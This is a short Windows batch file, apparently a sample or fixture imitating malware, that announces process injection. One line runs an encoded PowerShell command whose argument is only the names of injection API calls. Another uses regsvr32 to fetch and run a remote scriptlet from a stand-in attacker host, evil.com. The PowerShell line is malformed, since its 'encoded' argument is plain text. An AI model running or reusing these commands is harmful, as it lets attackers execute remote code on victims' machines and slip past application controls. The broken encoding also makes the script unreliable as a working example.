@echo off
echo Creating remote thread for process injection
powershell -enc "CreateRemoteThread VirtualAllocEx WriteProcessMemory"
regsvr32 /s /u /i:http://evil.com/payload.sct scrobj.dll
